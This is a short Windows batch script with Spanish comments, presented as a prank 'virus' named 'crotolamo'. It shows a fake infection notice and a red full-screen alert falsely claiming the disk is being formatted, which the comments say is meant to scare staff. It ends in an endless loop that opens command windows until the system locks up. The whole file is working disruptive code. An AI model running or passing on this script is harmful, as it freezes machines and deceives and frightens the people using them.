:: Mensaje inicial de infección
@echo off
echo Infectado por el virus crotolamo
pause

:: Añadimos al script el efecto pantalla parpadeante con una alerta para asustar al personal
@echo off
mode con: cols=700 lines=300
color 4F
title ALERTA - Sistema en peligro
echo ALERTA: ¡Tu disco está siendo formateado!
timeout /t 5 >nul

:: Añadimos un bucle infinito para que despues de los 5 segundos de espera, empiece a abrirse el cmd infinitas veces.
:loop
start cmd
goto loop





